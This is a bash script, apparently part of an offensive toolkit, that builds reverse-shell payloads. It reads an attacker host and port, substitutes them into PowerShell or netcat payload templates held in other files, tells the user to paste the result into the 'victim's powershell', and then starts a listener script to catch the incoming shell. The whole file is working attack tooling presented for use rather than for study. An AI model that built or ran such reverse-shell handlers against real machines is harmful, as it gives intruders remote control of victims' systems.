VERMILION='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN="\e[96m"
WHITE='\033[0;37m'
sleep 0.5
echo -e "${WHITE}Netcat TCP Multi-Handler ..."
sleep 0.5
echo -e "${CYAN}"
read -p "Enter the Netcat TCP Multi-Handler host >>" LHOST
read -p "Enter the Netcat TCP Multi-Handler port >>" LPORT
echo -e "${WHITE}Netcat TCP Multi-Handler started."
sleep 0.5
show_menu() {
echo -e "${CYAN} [1] Build Powershell Multi-Handler"
echo -e "${CYAN} [2] Build netcat Multi-Handler"
echo -e "${CYAN} [3] Exit"
echo -n " Please select an option: "
}

handle_choice() {
    case $1 in
        1) echo -e "\e[90m"
        cat src/powerpay.txt | sed "s/<LHOST>/$LHOST/g" | sed "s/<LPORT>/$LPORT/g"
        echo -e "\e[94m"
        echo "Copy the script and paste it to victim's powershell"
        echo -e "\e[93mYou can also make an .ps1 file with this script";;
        2) echo -e "\e[90m"
        cat src/netpay.txt | sed "s/<LHOST>/$LHOST/g" | sed "s/<LPORT>/$LPORT/g"
        echo -e "\e[94m";;
        3) echo "Exiting..."; exit 0;;
        *) echo "Invalid option";;
    esac
}

# Main loop to show the menu and handle choices
while true; do
    show_menu
    read choice
    handle_choice $choice
     echo -e "${CYAN}"
    bash src/multihandler/multihandlerpow.sh $LHOST $LPORT 
    
    echo -e "${CYAN}\nPress any key to return to the menu..."
    read -n 1
done

"
